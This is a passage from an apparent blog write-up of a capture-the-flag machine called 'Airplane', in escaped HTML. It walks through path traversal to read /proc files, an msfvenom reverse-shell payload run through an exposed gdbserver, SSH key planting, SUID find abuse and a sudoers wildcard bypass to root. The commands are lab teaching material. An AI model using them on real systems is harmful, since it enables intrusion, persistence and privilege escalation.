+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729175501.webp">&lt;/figure>
+&lt;p>To fix the output we can easily pipe that into sed and replace the null bytes to new line characters to get a clean output.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl --path-as-is &lt;span style="color:#b8bb26">&amp;#39;10.10.121.174:8000/?page=../../../../../../proc/self/environ&amp;#39;&lt;/span> --silent --output - | sed -e &lt;span style="color:#b8bb26">&amp;#39;s/\x0/\n/g&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## When dealing with stdin we use -e or --expression instead of -i&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## The format is like `s/find/replace/g`&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## s -&amp;gt; search&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## \x0 -&amp;gt; null byte&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## \n -&amp;gt; new line&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## g -&amp;gt; means global, all occurances will be replaced&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729175615.webp">&lt;/figure>
+&lt;p>We can see that the current user is &lt;code>hudson&lt;/code>. We already checked the ssh key in the home directory of hudson.
+And now we can confirm that it does not exist.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl --path-as-is &lt;span style="color:#b8bb26">&amp;#39;10.10.121.174:8000/?page=../../../../../../proc/self/cmdline&amp;#39;&lt;/span> --silent --output - | sed -e &lt;span style="color:#b8bb26">&amp;#39;s/\x0/\n/g&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/python3
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>app.py
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I tried to read the content of the &lt;code>app.py&lt;/code> file&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl --path-as-is &lt;span style="color:#b8bb26">&amp;#39;10.10.121.174:8000/?page=../../../../../../proc/self/cwd/app.py&amp;#39;&lt;/span> --silent --output - | sed -e &lt;span style="color:#b8bb26">&amp;#39;s/\x0/\n/g&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">from&lt;/span> flask &lt;span style="color:#fe8019">import&lt;/span> Flask, send_file, redirect, render_template, request
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">import&lt;/span> os.path
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>app &lt;span style="color:#fe8019">=&lt;/span> Flask(__name__)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@app.route(&lt;span style="color:#b8bb26">&amp;#39;/&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">index&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;page&amp;#39;&lt;/span> &lt;span style="color:#fe8019">in&lt;/span> request&lt;span style="color:#fe8019">.&lt;/span>args:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> page &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;static/&amp;#39;&lt;/span> &lt;span style="color:#fe8019">+&lt;/span> request&lt;span style="color:#fe8019">.&lt;/span>args&lt;span style="color:#fe8019">.&lt;/span>get(&lt;span style="color:#b8bb26">&amp;#39;page&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> os&lt;span style="color:#fe8019">.&lt;/span>path&lt;span style="color:#fe8019">.&lt;/span>isfile(page):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resp &lt;span style="color:#fe8019">=&lt;/span> send_file(page)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resp&lt;span style="color:#fe8019">.&lt;/span>direct_passthrough &lt;span style="color:#fe8019">=&lt;/span> &lt;span style="color:#fe8019">False&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">if&lt;/span> os&lt;span style="color:#fe8019">.&lt;/span>path&lt;span style="color:#fe8019">.&lt;/span>getsize(page) &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#d3869b">0&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resp&lt;span style="color:#fe8019">.&lt;/span>headers[&lt;span style="color:#b8bb26">&amp;#34;Content-Length&amp;#34;&lt;/span>]&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fabd2f">str&lt;/span>(&lt;span style="color:#fabd2f">len&lt;/span>(resp&lt;span style="color:#fe8019">.&lt;/span>get_data()))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> resp
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> &lt;span style="color:#b8bb26">&amp;#34;Page not found&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> redirect(&lt;span style="color:#b8bb26">&amp;#39;http://airplane.thm:8000/?page=index.html&amp;#39;&lt;/span>, code&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">302&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>@app.route(&lt;span style="color:#b8bb26">&amp;#39;/airplane&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">def&lt;/span> &lt;span style="color:#fabd2f">airplane&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#fe8019">return&lt;/span> render_template(&lt;span style="color:#b8bb26">&amp;#39;airplane.html&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fe8019">if&lt;/span> __name__ &lt;span style="color:#fe8019">==&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;__main__&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> app&lt;span style="color:#fe8019">.&lt;/span>run(host&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#b8bb26">&amp;#39;0.0.0.0&amp;#39;&lt;/span>, port&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">8000&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Nothing interesting in there either.
+Then I tried to look into the &lt;code>/proc/sched_debug&lt;/code> to get information about the running processes.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl --path-as-is &lt;span style="color:#b8bb26">&amp;#39;10.10.121.174:8000/?page=../../../../../../proc/sched_debug&amp;#39;&lt;/span> --silent --output - | sed -e &lt;span style="color:#b8bb26">&amp;#39;s/\x0/\n/g&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It generates a long output of all the running processes. After skimming through it I found some python processes:&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729181205.webp">&lt;/figure>
+&lt;p>We can check what the command is by using the pid of the process:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl --path-as-is &lt;span style="color:#b8bb26">&amp;#39;10.10.121.174:8000/?page=../../../../../../proc/$PID/cmdline&amp;#39;&lt;/span> --silent --output - | sed -e &lt;span style="color:#b8bb26">&amp;#39;s/\x0/\n/g&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Nothing important there, its our flask app&lt;/p>
+&lt;p>I also saw a &lt;code>gdbserver&lt;/code> instance in there.&lt;/p>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729181459.webp">&lt;/figure>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl --path-as-is &lt;span style="color:#b8bb26">&amp;#39;10.10.121.174:8000/?page=../../../../../../proc/527/cmdline&amp;#39;&lt;/span> --silent --output - | sed -e &lt;span style="color:#b8bb26">&amp;#39;s/\x0/\n/g&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/usr/bin/gdbserver
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0.0.0.0:6048
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>airplane
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>gdbserver&lt;/code> is running on port 6048. I tried some searching and found out that if remote debugging is enabled in gdb, we can upload a reverse shell and execute it.
+&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver">https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver&lt;/a>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## Generate the payload using msfvenom&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>msfvenom -p linux/x64/shell_reverse_tcp LHOST&lt;span style="color:#fe8019">=&lt;/span>tun0 LPORT&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#d3869b">1234&lt;/span> PrependFork&lt;span style="color:#fe8019">=&lt;/span>&lt;span style="color:#fabd2f">true&lt;/span> -f elf -o binary.elf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>chmod +x ./binary.elf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#928374;font-style:italic">## open gdb&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gdb ./binary.elf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>target extended-remote 10.10.121.174:6048
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>remote put binary.elf /dev/shm/binary.elf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">set&lt;/span> remote exec-file /dev/shm/binary.elf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>run
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;blockquote>
+&lt;p>NOTE: If you are using &lt;code>peda&lt;/code>, &lt;code>gef&lt;/code> or any other gdb enhancement tools, start gdb using the -nx flag
+otherwise it cause some error when using remote debugging: &lt;code>gdb -nx ./binary.elf&lt;/code>&lt;/p>
+&lt;/blockquote>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729183159.webp">&lt;/figure>
+&lt;p>Got shell.&lt;/p>
+&lt;blockquote>
+&lt;p>Check out &lt;a href="https://github.com/hanslub42/rlwrap">rlwrap&lt;/a>
+It can be used with commands like &lt;code>nc&lt;/code> to be able to use the arrow keys for editing and accessing the command history etc. in a limited shell environment.&lt;/p>
+&lt;/blockquote>
+&lt;p>I added an ssh key to hudson&amp;rsquo;s home directory anyway&amp;hellip;&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>ssh-keygen -t ed25519 -N &lt;span style="color:#b8bb26">&amp;#39;&amp;#39;&lt;/span> -f ./ctf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>This command will generate 2 files - &lt;code>ctf&lt;/code> and &lt;code>ctf.pub&lt;/code>.
+&lt;code>ctf&lt;/code> is the private key that we use to log in and &lt;code>ctf.pub&lt;/code> contains the public key that we copy to the machine.
+Copy the content of the &lt;code>ctf.pub&lt;/code> file to &lt;code>/home/hudson/.ssh/authoried_keys&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;ssh-...&amp;#39;&lt;/span> &amp;gt; /home/hudson/.ssh/authorized_keys
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now we can login as hudson through ssh&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>chmod &lt;span style="color:#d3869b">600&lt;/span> ctf
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ssh hudson@airplane.thm -i ctf
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
+&lt;h2 id="lateral-movement-to-carlos">Lateral Movement to carlos&lt;/h2>
+&lt;h3 id="local-enumeration">Local Enumeration&lt;/h3>
+&lt;p>Finding SUID binaries&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>find / -type f -perm -u&lt;span style="color:#fe8019">=&lt;/span>s -exec ls -alp &lt;span style="color:#fe8019">{}&lt;/span> &lt;span style="color:#b8bb26">\;&lt;/span> 2&amp;gt;/dev/null
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
+&lt;blockquote>
+&lt;p>SUID: Set User ID is a type of permission that allows users to execute a file with the permissions of a specified user. Those files which have suid permissions run with higher privileges.
+To learn more about Privilege Escalation using SUID binaries checkout &lt;a href="https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">this article&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729184219.webp">&lt;/figure>
+&lt;h3 id="lateral-movement">Lateral Movement&lt;/h3>
+&lt;p>We can use the &lt;code>-exec&lt;/code> argument in the &lt;code>find&lt;/code> command to execute commands as user carlos.
+So to gain shell access as carlos we just need to run:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>find -exec bash -ip &lt;span style="color:#b8bb26">\;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729184608.webp">&lt;/figure>
+&lt;p>I put the ssh key into carlos as well. SSH is better.&lt;/p>
+&lt;hr>
+&lt;h2 id="privilege-escalation">Privilege Escalation&lt;/h2>
+&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729190926.webp">&lt;/figure>
+&lt;p>It means that we can run ruby scripts using &lt;code>/usr/bin/ruby&lt;/code> with sudo without using password. But it also ensures that we can only run
+scripts located inside the &lt;code>/root/&lt;/code> directory. And to check whether the givin script is present in the &lt;code>/root&lt;/code> directory they uses &lt;code>*&lt;/code> character.
+We can bypass this check easily because we can replace the &lt;code>*&lt;/code> with any character we want, and we can exploit it similiarly to a path traversal attack.
+For that we create a ruby script in &lt;code>/tmp&lt;/code> or any other directory and when running it we use relative path to that of the &lt;code>/root&lt;/code> directory.
+For example &lt;code>/tmp/shell.rb&lt;/code> becomes &lt;code>/root/../tmp/shell.rb&lt;/code>. Note that this matches the &lt;code>/root/*.rb&lt;/code> check in the sudoers file.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#ebdbb2;background-color:#282828;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#fabd2f">echo&lt;/span> &lt;span style="color:#b8bb26">&amp;#39;system(&amp;#34;/bin/bash -ip&amp;#34;);&amp;#39;&lt;/span> &amp;gt; /tmp/shell.rb
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sudo /usr/bin/ruby /root/../tmp/shell.rb
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;figure>
+&lt;img src="https://h4r1337.github.io/img/airplane/Pasted%20image%2020240729191305.webp">&lt;/figure>
+&lt;p>If you want to learn more about this type of attacks, check out &lt;a href="https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-4-wildcards/">this article&lt;/a>&lt;/p>
+&lt;hr>
+&lt;h4 id="resources">Resources&lt;/h4>
+&lt;ul>
+&lt;li>&lt;a href="https://httpie.io/">httpie&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://www.daehee.com/blog/werkzeug-console-pin-exploit">Werkzeug Console PIN Exploit&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#the-proc-file-system">The &lt;code>proc&lt;/code> File System&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver">Pentesting Remote GdbServer&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://github.com/hanslub42/rlwrap">rlwrap&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://gtfobins.github.io/gtfobins/find/">find - GTFOBins&lt;/a>&lt;/li>
+&lt;li>&lt;a href="https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-4-wildcards/">Dangerous Sudoers Entries – PART 4: Wildcards&lt;/a>&lt;/li>
+&lt;/ul></content></item></channel></rss>
